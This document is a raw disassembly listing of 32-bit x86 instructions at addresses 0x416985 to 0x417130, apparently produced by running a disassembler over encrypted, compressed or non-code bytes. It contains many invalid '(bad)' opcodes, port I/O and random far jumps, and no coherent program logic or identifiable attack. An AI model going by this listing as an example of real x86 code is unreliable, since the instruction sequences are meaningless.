  416985:	imul   ebp,DWORD PTR [eax],0x8d101ed7
  41698b:	pop    es
  41698c:	mov    dh,0x57
  41698e:	sbb    ebx,DWORD PTR [eax+0x619bd91a]
  416994:	out    0x66,eax
  416996:	push   edx
  416997:	out    0x20,eax
  416999:	scas   al,BYTE PTR es:[edi]
  41699a:	sbb    ecx,DWORD PTR [edx+0x42281d0b]
  4169a0:	in     al,dx
  4169a1:	pusha  
  4169a2:	icebp  
  4169a3:	mov    WORD PTR [ecx+edi*1],?
  4169a6:	pop    ecx
  4169a7:	add    bh,BYTE PTR [ebx+0x39]
  4169aa:	test   DWORD PTR [ebx-0xff96b8e],esp
  4169b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169b1:	fwait
  4169b2:	or     al,0x5f
  4169b4:	and    al,0x8a
  4169b6:	(bad)  
  4169b7:	mul    BYTE PTR [ebx-0x7b]
  4169ba:	lea    edi,[edi-0x75]
  4169bd:	jnp    0x416a07
  4169bf:	xchg   ebx,eax
  4169c0:	fld    st(7)
  4169c2:	jns    0x41696a
  4169c4:	mov    ds:0x8659cfdc,al
  4169c9:	xor    BYTE PTR [edi+0x1d6d1126],0x3
  4169d0:	dec    esp
  4169d1:	mov    al,ds:0xa8b569ec
  4169d6:	mov    edi,0x903045bf
  4169db:	sub    al,0x9e
  4169dd:	jmp    0x416987
  4169df:	adc    ebp,edx
  4169e1:	sbb    eax,0x8a0e4604
  4169e6:	out    0x63,eax
  4169e8:	jecxz  0x4169ed
  4169ea:	mov    esp,0xdfd993ac
  4169ef:	or     al,0x90
  4169f1:	loope  0x4169d9
  4169f3:	jl     0x416996
  4169f5:	adc    BYTE PTR [edx+eiz*8+0x22],ch
  4169f9:	sbb    BYTE PTR [esi-0x15],al
  4169fc:	dec    ebp
  4169fd:	into   
  4169fe:	std    
  4169ff:	rcr    DWORD PTR [edi-0x63bfcfbe],cl
  416a05:	sbb    eax,esp
  416a07:	test   BYTE PTR [eax-0x2f],dl
  416a0a:	dec    eax
  416a0b:	(bad)  
  416a0c:	push   ss
  416a0d:	jg     0x4169a4
  416a0f:	dec    BYTE PTR [ebp+0xf372e24]
  416a15:	stos   DWORD PTR es:[edi],eax
  416a16:	mov    edx,DWORD PTR [edx-0x362d1c73]
  416a1c:	ins    DWORD PTR es:[edi],dx
  416a1d:	and    al,0xd
  416a1f:	icebp  
  416a20:	mov    BYTE PTR [ebx-0x16ef6ec7],0xa6
  416a27:	dec    esp
  416a28:	sbb    cl,BYTE PTR [ecx-0x2a1b5e8f]
  416a2e:	mov    WORD PTR [eax-0x54e718d6],cs
  416a34:	(bad)  
  416a35:	enter  0xb4a1,0x2a
  416a39:	sbb    al,0x92
  416a3b:	test   BYTE PTR [ecx+0x38],cl
  416a3e:	jmp    0x5898ffb0
  416a43:	sbb    ecx,DWORD PTR [ebx+0x588b1ea]
  416a49:	mov    eax,0x4ebad759
  416a4e:	data16 aas 
  416a50:	test   ebx,eax
  416a52:	ret    0x2
  416a55:	and    al,0x9
  416a57:	ficomp DWORD PTR [edx+0x74]
  416a5a:	pxor   mm1,QWORD PTR [ebx]
  416a5d:	mov    bl,0xa1
  416a5f:	mov    al,0x1e
  416a61:	adc    al,BYTE PTR [esi+0x1d793969]
  416a67:	and    al,0x54
  416a69:	push   cs
  416a6a:	(bad)  
  416a6b:	jecxz  0x416ab4
  416a6d:	dec    ebx
  416a6e:	mov    WORD PTR [ecx],ds
  416a70:	adc    al,0x8c
  416a72:	sar    BYTE PTR [eax+0x78499e94],cl
  416a78:	push   edi
  416a79:	in     eax,dx
  416a7a:	and    eax,0xdbafcced
  416a7f:	lods   al,BYTE PTR ds:[esi]
  416a80:	push   edx
  416a81:	pop    edx
  416a82:	cmp    BYTE PTR [ebx-0x4e],al
  416a85:	add    BYTE PTR [ebx],0x53
  416a88:	and    DWORD PTR [eax],edi
  416a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a8b:	sbb    al,0x3b
  416a8d:	dec    BYTE PTR [edi-0x1d]
  416a90:	pop    eax
  416a91:	int3   
  416a92:	arpl   WORD PTR [edx+eiz*2],dx
  416a95:	repz sbb ecx,DWORD PTR [ecx-0x35]
  416a99:	and    DWORD PTR [ebx],0xede262eb
  416a9f:	and    DWORD PTR [eax-0x52],ecx
  416aa2:	push   ecx
  416aa3:	mov    ecx,0x401f034e
  416aa8:	mov    ebp,0x64e422a9
  416aad:	pop    ss
  416aae:	mov    bl,0x1d
  416ab0:	enter  0x6909,0x1c
  416ab4:	loop   0x416aa0
  416ab6:	sar    BYTE PTR [eax+0x29cc2a8e],cl
  416abc:	mov    ds:0xbaf3bc42,eax
  416ac1:	addr16 add dh,al
  416ac4:	test   eax,0x43b0b119
  416ac9:	rcl    BYTE PTR [esi-0x4d],cl
  416acc:	ret    0x441
  416acf:	mov    edi,0xb9ffc5f5
  416ad4:	or     eax,0x76d129bc
  416ad9:	adc    al,0x0
  416adb:	stos   DWORD PTR es:[edi],eax
  416adc:	stos   BYTE PTR es:[edi],al
  416add:	dec    edx
  416ade:	in     al,dx
  416adf:	cmp    BYTE PTR [ebp-0xe],bl
  416ae2:	jne    0x416af4
  416ae4:	mov    cl,0xca
  416ae6:	push   0xffffff95
  416ae8:	and    cl,bh
  416aea:	push   ebx
  416aeb:	fbld   TBYTE PTR [edx-0x397999ad]
  416af1:	inc    esi
  416af2:	jae    0x416ab1
  416af4:	out    dx,eax
  416af5:	in     eax,0x54
  416af7:	pop    ebx
  416af8:	fiadd  DWORD PTR [esi+0x7ba4047d]
  416aff:	and    BYTE PTR [esi+0x54],al
  416b02:	ss mov esp,0x9aa72c66
  416b08:	std    
  416b09:	loopne 0x416a8e
  416b0b:	sbb    BYTE PTR [ebx-0x57d2dcb6],bh
  416b11:	rcl    BYTE PTR [ebx],0xd3
  416b14:	jge    0x416b0b
  416b16:	xchg   DWORD PTR [esi+0x39],esp
  416b19:	jns    0x416b64
  416b1b:	inc    edi
  416b1c:	dec    ebx
  416b1d:	jp     0x416b5b
  416b1f:	js     0x416b11
  416b21:	out    dx,eax
  416b22:	callw  0x7997
  416b26:	(bad)  
  416b27:	lea    ebx,[esi]
  416b29:	push   cs
  416b2a:	lock lds ecx,FWORD PTR [ebx-0x2cfc5f69]
  416b31:	push   ds
  416b32:	mov    edx,0xc897f7e6
  416b37:	jno    0x416bb1
  416b39:	jbe    0x416b8c
  416b3b:	cmp    eax,0xc76459f4
  416b40:	push   es
  416b41:	cmc    
  416b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b43:	jge    0x416b25
  416b45:	push   ebx
  416b46:	aam    0x8d
  416b48:	push   es
  416b49:	xor    eax,0xd8db3c46
  416b4e:	faddp  st(7),st
  416b50:	addr16 retf 0x164
  416b54:	ds cld 
  416b56:	xchg   ebp,eax
  416b57:	dec    eax
  416b58:	mov    bl,0xd9
  416b5a:	int3   
  416b5b:	mov    ecx,0x7e3f65c6
  416b60:	mov    eax,ds:0xde038df9
  416b65:	das    
  416b66:	(bad)  
  416b67:	lock cli 
  416b69:	retf   0xc3ed
  416b6c:	lock stos DWORD PTR es:[edi],eax
  416b6e:	out    0x27,al
  416b70:	outs   dx,DWORD PTR ds:[esi]
  416b71:	shr    DWORD PTR [esi+0x21],0xb6
  416b75:	leave  
  416b76:	or     bh,BYTE PTR [esi]
  416b78:	fdivr  QWORD PTR [ecx]
  416b7a:	mov    WORD PTR [eax-0x39117fee],es
  416b80:	xchg   ebp,ebx
  416b82:	jle    0x416ba6
  416b84:	call   0x50740ccb
  416b89:	icebp  
  416b8a:	jmp    0x3e95:0x7ae23cf
  416b91:	add    al,BYTE PTR [eax+ebx*1]
  416b94:	jne    0x416be0
  416b96:	dec    ebx
  416b97:	add    BYTE PTR ds:0x69589d04,0xa5
  416b9e:	adc    eax,DWORD PTR [edx-0x29]
  416ba1:	cmc    
  416ba2:	push   0x1c
  416ba4:	outs   dx,BYTE PTR ds:[esi]
  416ba5:	int3   
  416ba6:	or     ah,bl
  416ba8:	in     al,dx
  416ba9:	rcl    al,0xc0
  416bac:	jns    0x416c1f
  416bae:	or     al,dh
  416bb0:	ss daa 
  416bb2:	out    0xb1,eax
  416bb4:	mov    DWORD PTR [esi],esp
  416bb6:	sbb    ebx,esi
  416bb8:	jne    0x416b69
  416bba:	cmp    bh,bh
  416bbc:	fisub  WORD PTR [edx-0x2bfaf0ef]
  416bc2:	frstor [edx+0x3]
  416bc5:	adc    al,0xc0
  416bc7:	imul   esp,DWORD PTR [edx],0xb9d63719
  416bcd:	pop    esp
  416bce:	repz gs inc edx
  416bd1:	cmc    
  416bd2:	mov    al,0x53
  416bd4:	xlat   BYTE PTR ds:[ebx]
  416bd5:	add    al,0x5a
  416bd7:	repz mov eax,0x5aa1cc9b
  416bdd:	cmp    eax,DWORD PTR [ecx+0x401d3b97]
  416be3:	std    
  416be4:	int    0xcb
  416be6:	xchg   esp,eax
  416be7:	dec    ecx
  416be8:	cwde   
  416be9:	or     al,BYTE PTR [eax-0x3e0a65cf]
  416bef:	gs aaa 
  416bf1:	lock sub DWORD PTR [ebx],ebp
  416bf4:	adc    eax,0x5f61a8e5
  416bf9:	and    eax,0x5aac589
  416bfe:	jle    0x416b8c
  416c00:	xchg   ecx,eax
  416c01:	or     dh,dl
  416c03:	cmp    ebp,edx
  416c05:	addr16 jge 0x416c03
  416c08:	sub    esi,DWORD PTR [edx]
  416c0a:	sub    BYTE PTR [eax+0x29a1146b],al
  416c10:	xor    edx,DWORD PTR [ecx]
  416c12:	jns    0x416c48
  416c14:	sbb    cl,cl
  416c16:	outs   dx,DWORD PTR ds:[esi]
  416c17:	call   0xda985339
  416c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c1e:	add    DWORD PTR [eax+0x414561ed],edi
  416c24:	add    eax,0x80984b1e
  416c29:	push   ebp
  416c2a:	pop    esi
  416c2b:	cwde   
  416c2c:	jae    0x416c94
  416c2e:	pop    ecx
  416c2f:	inc    edx
  416c30:	dec    edi
  416c31:	xchg   BYTE PTR ds:0x12963758,dl
  416c37:	popf   
  416c38:	pop    ebp
  416c39:	mov    BYTE PTR [edx],bl
  416c3b:	(bad)  
  416c3c:	and    al,BYTE PTR [esi+0x553e55ea]
  416c42:	fwait
  416c43:	xchg   ebx,eax
  416c44:	jnp    0x416bf5
  416c46:	sub    eax,0xe1ddb02e
  416c4b:	add    edx,DWORD PTR [edx+0x5f]
  416c4e:	jmp    0xd1aa:0xb7f36043
  416c55:	sahf   
  416c56:	pop    edi
  416c57:	(bad)  
  416c58:	fcom   DWORD PTR [edx]
  416c5a:	hlt    
  416c5b:	pop    edi
  416c5c:	xchg   ecx,eax
  416c5d:	popa   
  416c5e:	jge    0x416c70
  416c60:	fwait
  416c61:	imul   edx,DWORD PTR ds:0xeb460834,0x1ccc40f6
  416c6b:	inc    esi
  416c6c:	pop    edi
  416c6d:	sub    al,0x5d
  416c6f:	xchg   esp,eax
  416c70:	sbb    al,0x5
  416c72:	(bad)  
  416c73:	mov    eax,DWORD PTR [esi+0x40bb2a8d]
  416c79:	push   eax
  416c7a:	push   ecx
  416c7b:	lea    ecx,[edi-0x502dbd90]
  416c81:	mov    ch,0xcf
  416c83:	push   ds
  416c84:	mov    dh,0x19
  416c86:	add    edx,DWORD PTR [edx]
  416c88:	or     eax,0xc3eee634
  416c8d:	pop    ds
  416c8e:	mov    edx,0x343dba95
  416c93:	xchg   esi,eax
  416c94:	add    eax,0xf164a805
  416c99:	mov    al,0xaa
  416c9b:	adc    BYTE PTR [eax],0x5d
  416c9e:	dec    esp
  416c9f:	pusha  
  416ca0:	push   esi
  416ca1:	lds    edx,FWORD PTR [ebx]
  416ca3:	nop
  416ca4:	jecxz  0x416c98
  416ca6:	push   ebp
  416ca7:	in     al,0x25
  416ca9:	imul   dx,WORD PTR [edx-0x1d99593e],0x69
  416cb1:	mov    dl,ah
  416cb3:	jbe    0x416d14
  416cb5:	mov    esi,0x5895767b
  416cba:	and    al,0x53
  416cbc:	xchg   edi,eax
  416cbd:	stos   DWORD PTR es:[edi],eax
  416cbe:	or     al,0xc2
  416cc1:	xor    al,BYTE PTR [edx]
  416cc3:	sub    DWORD PTR [esi+0x57],0x30
  416cc7:	add    eax,0x79b87c17
  416ccc:	jnp    0x416c95
  416cce:	push   ds
  416ccf:	mov    WORD PTR [ebp-0x21d33f09],ds
  416cd5:	pop    ebp
  416cd6:	sbb    DWORD PTR [eax],eax
  416cd8:	icebp  
  416cd9:	dec    eax
  416cda:	xor    ecx,DWORD PTR [edx+0xb]
  416cdd:	lock shl BYTE PTR [edx-0x5ec5b75f],0xce
  416ce5:	sbb    dh,BYTE PTR [esi+0xa409b1a]
  416ceb:	cmp    BYTE PTR ds:0xea53bbc7,0xd
  416cf2:	mov    al,BYTE PTR [edx+eax*8+0x7]
  416cf6:	xchg   ecx,eax
  416cf7:	sub    eax,0xdae44c18
  416cfc:	fld    DWORD PTR [edi]
  416cfe:	jbe    0x416d75
  416d00:	add    ah,cl
  416d02:	dec    ebp
  416d03:	fldcw  WORD PTR [esi+0x30ac59aa]
  416d09:	sar    edi,0x1f
  416d0c:	push   0xe
  416d0e:	pusha  
  416d0f:	mov    ebp,0xbe12f88d
  416d14:	inc    ecx
  416d15:	(bad)  
  416d16:	cmp    edi,ecx
  416d18:	lahf   
  416d19:	icebp  
  416d1a:	mov    bh,0xaa
  416d1c:	pop    edx
  416d1d:	jle    0x416d86
  416d1f:	int3   
  416d20:	shl    DWORD PTR [ebp-0x1b8f94cb],0x7d
  416d27:	in     al,dx
  416d28:	mov    BYTE PTR [ecx-0x64791214],bl
  416d2e:	sbb    BYTE PTR [esi+0x13],bl
  416d31:	xchg   DWORD PTR ss:[edx-0x60],esp
  416d35:	xor    al,0xb8
  416d37:	pop    ebp
  416d38:	ret    0x4cbe
  416d3b:	xchg   edx,eax
  416d3c:	in     eax,0xf3
  416d3e:	imul   esp,DWORD PTR [ebp+0x7f],0xffffff86
  416d42:	push   ds
  416d43:	sub    DWORD PTR [ebx+0x13],0x15
  416d47:	xchg   esi,eax
  416d48:	sbb    edx,0xfffffff0
  416d4b:	pop    esp
  416d4c:	push   es
  416d4d:	sbb    eax,0xa016f5ad
  416d52:	push   esi
  416d53:	shr    BYTE PTR [ecx-0x55],cl
  416d56:	adc    DWORD PTR [edi],ebp
  416d58:	je     0x416d44
  416d5a:	or     DWORD PTR [edi],edx
  416d5c:	gs mov bl,0x90
  416d5f:	retf   0x6c20
  416d62:	fild   DWORD PTR [ebp-0x5e2ad537]
  416d68:	imul   ebp,DWORD PTR [edx+0x3fbe6e67],0xffffffb9
  416d6f:	cs or  al,0xf9
  416d72:	add    DWORD PTR fs:[ebx+0x578d41e],esi
  416d79:	lods   al,BYTE PTR ds:[esi]
  416d7a:	shl    DWORD PTR [edi+0x19414870],0x66
  416d81:	sbb    ebx,edi
  416d83:	cli    
  416d84:	lods   al,BYTE PTR ds:[esi]
  416d85:	mov    WORD PTR [esi+0x6d],es
  416d88:	ret    0xd8d
  416d8b:	mov    ds:0xf1aaa586,al
  416d90:	jmp    0x416d5b
  416d92:	push   esi
  416d93:	xchg   edi,eax
  416d94:	std    
  416d95:	das    
  416d96:	lea    eax,ds:[edx]
  416d99:	mov    dh,0x11
  416d9c:	dec    ebx
  416d9d:	pop    esp
  416d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d9f:	jl     0x416d2a
  416da1:	mov    dl,0x78
  416da3:	dec    esp
  416da4:	sub    cl,dh
  416da6:	outs   dx,BYTE PTR ds:[esi]
  416da7:	data16 cmp BYTE PTR [esi],0x43
  416dab:	dec    edi
  416dac:	mov    ss,WORD PTR [eax]
  416dae:	cdq    
  416daf:	push   cs
  416db0:	and    ebp,esp
  416db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db3:	scas   al,BYTE PTR es:[edi]
  416db4:	inc    esi
  416db5:	sbb    ebp,DWORD PTR [edi]
  416db7:	test   eax,0x8c75025b
  416dbc:	mov    ebx,0xc49c0296
  416dc1:	(bad)  
  416dc2:	rcr    DWORD PTR [esi-0x1d],cl
  416dc5:	jbe    0x416dca
  416dc7:	xor    DWORD PTR [ecx-0x6a],edx
  416dca:	mov    ebp,ebx
  416dcc:	and    cl,BYTE PTR [ebx+0x15]
  416dcf:	sub    al,0x55
  416dd1:	fist   DWORD PTR [edi+eax*4]
  416dd4:	div    DWORD PTR [ebx]
  416dd6:	cmp    esi,eax
  416dd8:	jae    0x416e17
  416dda:	mov    dl,0x40
  416ddc:	xchg   edx,eax
  416ddd:	arpl   WORD PTR [edi-0x16f4fc57],dx
  416de3:	sar    BYTE PTR [ecx+0x71c8f914],1
  416de9:	(bad)  
  416dea:	fsub   QWORD PTR [ebx-0x40]
  416ded:	shr    bh,0xa
  416df0:	scas   eax,DWORD PTR es:[edi]
  416df1:	add    ch,0xd8
  416df4:	and    ebp,DWORD PTR [ebx-0x26]
  416df7:	call   0x8511:0xa787e012
  416dfe:	adc    eax,0x71e98ed9
  416e03:	ja     0x416e78
  416e05:	loop   0x416e2a
  416e07:	sbb    eax,0x86b19c23
  416e0c:	ins    BYTE PTR es:[edi],dx
  416e0d:	fbld   TBYTE PTR [ebx]
  416e0f:	dec    ebp
  416e11:	jnp    0x416e25
  416e13:	mov    ecx,0xc95366ed
  416e18:	push   ds
  416e19:	jb     0x416df0
  416e1b:	and    ecx,DWORD PTR [edi]
  416e1d:	fs retf 0xffc5
  416e21:	pop    ebx
  416e22:	imul   esi,DWORD PTR [edx],0xffffff82
  416e25:	std    
  416e26:	fadd   st(3),st
  416e28:	cmp    eax,0xff8a8480
  416e2d:	xchg   ebp,eax
  416e2e:	int3   
  416e2f:	lock aaa 
  416e31:	pop    es
  416e32:	lahf   
  416e33:	adc    eax,0x3106f345
  416e38:	cmp    al,0x5a
  416e3a:	pop    edx
  416e3b:	inc    esp
  416e3c:	loop   0x416dd6
  416e3e:	scas   al,BYTE PTR es:[edi]
  416e3f:	push   ecx
  416e40:	inc    esi
  416e41:	sub    ch,BYTE PTR [edi]
  416e43:	xchg   dl,bl
  416e45:	jg     0x416df7
  416e47:	and    DWORD PTR [edi],0xffffff9e
  416e4a:	add    ah,BYTE PTR [edx-0x3b]
  416e4d:	mov    al,ds:0x58a1069d
  416e52:	xchg   DWORD PTR [edi+0x56],eax
  416e55:	mov    dh,0x69
  416e57:	jg     0x416e0e
  416e59:	pop    edi
  416e5a:	xor    eax,DWORD PTR [edi+0x6c]
  416e5d:	or     BYTE PTR [eax+0x396e9328],0x8b
  416e64:	cmp    bl,BYTE PTR [ecx-0x605c4461]
  416e6a:	jle    0x416e09
  416e6c:	dec    edx
  416e6d:	call   0xd55f:0xb6915109
  416e74:	frstor [ecx]
  416e76:	in     al,0x46
  416e78:	(bad)  
  416e79:	jno    0x416e35
  416e7b:	stos   BYTE PTR es:[edi],al
  416e7c:	rcl    bl,1
  416e7e:	imul   ebx,DWORD PTR [eax-0x20],0x1a
  416e82:	(bad)  
  416e83:	fistp  QWORD PTR [ecx+ecx*4-0x72769e82]
  416e8a:	arpl   WORD PTR [esi+0x60],ax
  416e8d:	stc    
  416e8e:	sahf   
  416e8f:	test   al,0xa8
  416e91:	mov    bh,0x2c
  416e93:	mov    bl,0xaf
  416e95:	xchg   ebp,eax
  416e96:	out    0x74,eax
  416e98:	xchg   DWORD PTR [ebx+0x15],edi
  416e9b:	xchg   edx,eax
  416e9c:	jbe    0x416eab
  416e9e:	fistp  WORD PTR [eax]
  416ea0:	adc    DWORD PTR [edi],ecx
  416ea2:	test   BYTE PTR [ecx],bl
  416ea4:	punpckhbw mm3,QWORD PTR [eax+edi*8-0x45]
  416ea9:	rol    DWORD PTR [ebx+0x75],0xbf
  416ead:	mul    ebx
  416eaf:	dec    eax
  416eb0:	cs (bad) 
  416eb2:	mov    dh,0x13
  416eb4:	arpl   ax,bx
  416eb6:	jecxz  0x416e8c
  416eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb9:	(bad)  [edx]
  416ebb:	mov    edx,0x74a89945
  416ec0:	retf   
  416ec1:	fsub   QWORD PTR [esi]
  416ec3:	and    esp,DWORD PTR [ebp+0x254cbf2d]
  416ec9:	jmp    0x293b:0x2cc1ba4e
  416ed0:	mov    ch,0xac
  416ed2:	imul   eax,DWORD PTR [ecx],0xffffff98
  416ed5:	(bad)  
  416ed7:	mov    ecx,0xb7b4c918
  416edc:	fdiv   st,st(7)
  416ede:	bound  ebx,QWORD PTR [eax+0x7c]
  416ee1:	mov    DWORD PTR [edx+ecx*1],esi
  416ee4:	jmp    0x416e96
  416ee6:	cmp    ecx,ebp
  416ee8:	cmc    
  416ee9:	inc    ebp
  416eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eeb:	pop    esp
  416eec:	jno    0x416e81
  416eee:	or     edx,DWORD PTR [eax-0x59]
  416ef1:	mov    bh,0x66
  416ef3:	pop    es
  416ef4:	mov    esp,0x23c0e2ba
  416ef9:	in     eax,dx
  416efa:	push   ds
  416efb:	pop    ebx
  416efc:	scas   al,BYTE PTR es:[edi]
  416efd:	iret   
  416efe:	mov    ebx,0x13f9e36a
  416f03:	push   edx
  416f04:	xor    ah,0x2a
  416f07:	aaa    
  416f08:	cmp    dh,dl
  416f0a:	je     0x416ed6
  416f0c:	fisttp QWORD PTR [ecx-0x38]
  416f0f:	and    eax,esi
  416f11:	out    0xd,eax
  416f13:	push   ebp
  416f14:	ret    
  416f15:	or     ecx,0xa7feab4a
  416f1b:	push   ds
  416f1c:	mov    al,0x32
  416f1e:	mov    edx,DWORD PTR [eax+eax*8]
  416f21:	mov    al,ds:0x7c81e639
  416f26:	or     edi,DWORD PTR [ecx]
  416f28:	rcr    ecx,0xec
  416f2b:	imul   esi,DWORD PTR [ebx+0x7c4a6e5e],0xa0249466
  416f35:	outs   dx,DWORD PTR ds:[esi]
  416f36:	xchg   edx,eax
  416f37:	pcmpeqd mm3,QWORD PTR [eax+0x11]
  416f3b:	lea    ebx,[edi+0x52]
  416f3e:	sbb    al,0xee
  416f40:	ins    BYTE PTR es:[edi],dx
  416f41:	fild   WORD PTR [edi]
  416f43:	ds inc esp
  416f45:	xor    eax,0x6a12c2fd
  416f4a:	push   es
  416f4b:	cmc    
  416f4c:	fiadd  WORD PTR [ebp-0x48]
  416f4f:	inc    edx
  416f50:	ret    0x37
  416f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f54:	sub    esp,DWORD PTR [esi-0x6fcc0109]
  416f5a:	into   
  416f5b:	adc    BYTE PTR [edi],ch
  416f5d:	fwait
  416f5e:	das    
  416f5f:	shr    BYTE PTR [ebp+0x3f],0xfe
  416f63:	or     BYTE PTR [edi+0x5ff6e27b],al
  416f69:	cs (bad) 
  416f6c:	pop    es
  416f6d:	dec    ecx
  416f6e:	xchg   edi,eax
  416f6f:	in     eax,dx
  416f70:	mov    es,WORD PTR gs:[edi-0x1e1b8c52]
  416f77:	cmp    al,0xe4
  416f79:	mov    eax,0xe5890bd
  416f7e:	or     esi,esp
  416f80:	mov    WORD PTR [esi+0x2f32b1ab],?
  416f86:	pop    ss
  416f87:	xchg   BYTE PTR [eax-0x463fea7a],dh
  416f8d:	or     edx,DWORD PTR [esi]
  416f8f:	outs   dx,DWORD PTR ds:[esi]
  416f90:	cs sub al,0x3c
  416f93:	ret    0x62c0
  416f96:	stos   DWORD PTR es:[edi],eax
  416f97:	stos   DWORD PTR es:[edi],eax
  416f98:	fs cwde 
  416f9a:	xor    DWORD PTR [esi],esp
  416f9c:	mov    ds:0x93396f3f,al
  416fa1:	retf   
  416fa2:	leave  
  416fa3:	pop    edi
  416fa4:	mov    dl,BYTE PTR fs:[esi]
  416fa7:	push   ebx
  416fa8:	repnz iret 
  416faa:	and    bh,ch
  416fac:	imul   esp,ecx,0x25b360fb
  416fb2:	push   edi
  416fb3:	inc    esp
  416fb4:	dec    esp
  416fb5:	js     0x41701e
  416fb7:	mov    esp,0xaf144d3e
  416fbc:	xor    dl,BYTE PTR [edi+0x98b0822]
  416fc2:	pusha  
  416fc3:	push   es
  416fc4:	jl     0x417029
  416fc6:	ret    0xd385
  416fc9:	cld    
  416fca:	out    0x9e,eax
  416fcc:	scas   eax,DWORD PTR es:[edi]
  416fcd:	je     0x416fca
  416fcf:	call   0xd06d:0xf5e66d25
  416fd6:	jo     0x416fa1
  416fd8:	mov    eax,ds:0x8c3ebdd7
  416fdd:	push   ebx
  416fde:	or     eax,0xeb07366b
  416fe3:	jmp    0x66f4efbe
  416fe8:	or     BYTE PTR [edx-0x22],al
  416feb:	gs in  eax,0x25
  416fee:	(bad)  
  416fef:	mov    edi,DWORD PTR [esi+0x68641451]
  416ff5:	xchg   esp,eax
  416ff6:	std    
  416ff7:	add    esi,DWORD PTR [ecx]
  416ff9:	inc    ecx
  416ffa:	cmp    dl,BYTE PTR [ebx]
  416ffc:	mov    ds:0x5522bcb5,eax
  417001:	nop
  417002:	mov    bh,0xde
  417004:	push   edi
  417005:	pop    ebx
  417006:	sub    DWORD PTR [ebx-0x4dcb9faa],edx
  41700c:	icebp  
  41700d:	aas    
  41700e:	pop    ecx
  41700f:	ins    BYTE PTR es:[edi],dx
  417010:	dec    edi
  417011:	pop    eax
  417012:	adc    DWORD PTR [ebp-0x63ba8d9c],ebx
  417018:	mov    bh,0x7f
  41701a:	aaa    
  41701b:	sti    
  41701c:	push   cs
  41701d:	int3   
  41701e:	leave  
  41701f:	pop    ecx
  417020:	cld    
  417021:	or     ah,BYTE PTR [eax-0x30923f41]
  417027:	push   eax
  417028:	(bad)  
  417029:	fistp  DWORD PTR [edx+ebx*1-0x6aa5eb04]
  417030:	popf   
  417031:	inc    DWORD PTR [edi]
  417033:	rcr    DWORD PTR [ecx],0xa1
  417036:	mov    esp,0xb112ba08
  41703b:	test   BYTE PTR [eax+0x698ad7b6],dl
  417041:	jnp    0x417079
  417043:	repnz inc ebx
  417045:	or     eax,0x59f0f411
  41704a:	add    ebx,DWORD PTR [ecx]
  41704c:	sub    al,BYTE PTR [edx+0xd]
  41704f:	cmp    ch,cl
  417051:	sub    ecx,edx
  417053:	pop    ss
  417054:	stos   DWORD PTR es:[edi],eax
  417055:	mov    esp,0x3569d13b
  41705a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705b:	(bad)  
  41705c:	mov    ebx,0x5dabf9c6
  417061:	dec    esi
  417062:	lods   al,BYTE PTR ds:[esi]
  417063:	aad    0x86
  417065:	pop    ds
  417066:	xchg   edx,eax
  417067:	push   edi
  417068:	mov    eax,ds:0xc67214ed
  41706d:	push   es
  41706e:	mov    al,0xfe
  417070:	cs fwait
  417072:	int3   
  417073:	sbb    edi,DWORD PTR [edx*4-0x633a76f5]
  41707a:	out    dx,al
  41707b:	das    
  41707c:	sub    al,0xf2
  41707f:	inc    edx
  417080:	xchg   esi,eax
  417081:	test   BYTE PTR [ecx],ah
  417083:	stos   DWORD PTR es:[edi],eax
  417084:	enter  0x2407,0x97
  417088:	pop    ecx
  417089:	into   
  41708a:	xor    BYTE PTR [eax+0x8],cl
  41708d:	jl     0x4170f6
  41708f:	mov    ebx,DWORD PTR [edx]
  417091:	inc    esi
  417092:	cwde   
  417093:	ret    
  417094:	jo     0x417031
  417096:	(bad)  
  417097:	mov    ah,0x82
  417099:	fmul   st,st(4)
  41709b:	ins    BYTE PTR es:[edi],dx
  41709c:	inc    edx
  41709d:	js     0x41707c
  41709f:	scas   al,BYTE PTR es:[edi]
  4170a0:	sub    BYTE PTR [edi-0x9584cad],bh
  4170a6:	fldcw  WORD PTR [ebx-0x139b2984]
  4170ac:	or     ebp,DWORD PTR [ecx-0x6adc3f22]
  4170b2:	retf   0x176d
  4170b5:	xchg   esi,eax
  4170b6:	fldenv [ecx-0x23]
  4170b9:	mov    WORD PTR [eax-0x7c1e07aa],fs
  4170bf:	data16 adc cl,BYTE PTR ss:[esi]
  4170c3:	stos   BYTE PTR es:[edi],al
  4170c4:	pop    ebp
  4170c5:	(bad)  
  4170c7:	test   BYTE PTR [edx+0xa],al
  4170ca:	push   ebp
  4170cb:	(bad)  [eax-0x62]
  4170ce:	dec    eax
  4170cf:	pop    eax
  4170d0:	cmc    
  4170d1:	push   es
  4170d2:	retf   
  4170d3:	and    eax,0x7e4788f2
  4170d8:	dec    ebp
  4170d9:	call   0xb181b475
  4170de:	mov    ds:0xc86f981f,al
  4170e3:	int    0x8b
  4170e5:	push   ds
  4170e6:	cmp    esp,edi
  4170e8:	push   ebp
  4170e9:	jo     0x417145
  4170eb:	dec    ebx
  4170ec:	popf   
  4170ed:	loopne 0x41716d
  4170ef:	push   0x14
  4170f1:	sar    ebp,1
  4170f3:	in     eax,0x60
  4170f5:	aas    
  4170f6:	lods   eax,DWORD PTR ds:[esi]
  4170f7:	lods   eax,DWORD PTR ds:[esi]
  4170f8:	sbb    eax,0x7c5437ab
  4170fd:	mov    dl,0x56
  4170ff:	lahf   
  417100:	les    esi,FWORD PTR [edi-0x6216421b]
  417106:	mov    dh,0x6
  417108:	fwait
  417109:	shl    dl,cl
  41710b:	ins    DWORD PTR es:[edi],dx
  41710c:	xor    DWORD PTR ds:0x784d8df6,ebx
  417112:	mov    cl,0xb
  417114:	cld    
  417115:	sbb    DWORD PTR [edi+0x4fbd3913],ebp
  41711b:	adc    eax,0x4de11331
  417120:	rcr    BYTE PTR [esi],cl
  417122:	mov    edx,0xebf8a8df
  417127:	retf   0x678a
  41712a:	sbb    ebp,DWORD PTR [ebx+0xaac53e9]
  417130:	pop    ebp
